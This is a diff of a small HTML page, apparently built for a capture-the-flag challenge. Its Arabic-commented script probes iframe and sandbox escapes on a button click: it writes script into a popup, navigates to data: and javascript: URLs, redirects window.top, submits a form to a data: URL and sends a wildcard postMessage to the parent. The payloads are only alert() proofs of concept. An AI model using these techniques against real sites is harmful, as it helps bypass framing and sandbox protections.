@@ -1,9 +1,86 @@
 <!doctype html>
 <html>
-<body style="background:black;display:flex;justify-content:center;align-items:center;height:100vh;">
-<button onclick="window.open('javascript:alert(1)');"
-        style="padding:40px;font-size:30px;">
-  CLICK HERE
-</button>
+<head>
+  <meta charset="utf-8">
+  <title>CTF iframe test - click me</title>
+</head>
+<body style="display:flex;align-items:center;justify-content:center;height:100vh;">
+  <button id="go" style="padding:20px;font-size:18px;">اضغط هنا</button>
+
+<script>
+document.getElementById('go').addEventListener('click', function(){
+  // 1) محاولة فتح نافذة وتهيئتها عبر كتابة سكربت بداخلها
+  try {
+    var w = window.open('', '_blank');
+    if (w) {
+      try {
+        w.document.open();
+        w.document.write('<!doctype html><html><body><script>alert("popup via write!")<\/script></body></html>');
+        w.document.close();
+      } catch(e) {
+        console.log('failed write into popup:', e);
+      }
+    } else {
+      console.log('window.open returned null (blocked)');
+    }
+  } catch(e) {
+    console.log('window.open exception:', e);
+  }
+
+  // 2) محاولة window.open() الى data: URL
+  try {
+    var w2 = window.open('data:text/html,<script>alert("data url!")<\/script>', '_blank');
+    console.log('open data returned:', !!w2);
+  } catch(e) {
+    console.log('open data ex:', e);
+  }
+
+  // 3) محاولة تغيير top location (قد يُحظر إذا البراوزر يمنعها)
+  try {
+    if (window.top !== window.self) {
+      try {
+        window.top.location.href = 'data:text/html,<script>alert("top nav!")<\/script>';
+        console.log('tried to set top.location');
+      } catch(e) {
+        console.log('top.location blocked:', e);
+      }
+    } else {
+      console.log('not framed as top');
+    }
+  } catch(e) {
+    console.log('top check failed:', e);
+  }
+
+  // 4) محاولة فتح javascript: (غالبا محظور لكن نجرب)
+  try {
+    var w3 = window.open('javascript:alert("js scheme!")', '_blank');
+    console.log('open javascript: ->', !!w3);
+  } catch(e) {
+    console.log('open javascript: ex', e);
+  }
+
+  // 5) تنقل الإطار لنفسه (form submit fallback)
+  try {
+    var f = document.createElement('form');
+    f.method = 'GET';
+    f.action = 'data:text/html,<script>alert("form->data!")<\/script>';
+    document.body.appendChild(f);
+    f.submit();
+    f.remove();
+    console.log('submitted form to data:');
+  } catch(e) {
+    console.log('form submit failed:', e);
+  }
+
+  // 6) نرسل رسالة للـ parent (لو فيه listener ممكن يستغلها)
+  try {
+    parent.postMessage('ctf-check:<iframe-clicked>','*');
+    console.log('posted message to parent');
+  } catch(e) {
+    console.log('postMessage failed:', e);
+  }
+
+});
+</script>
 </body>
 </html>
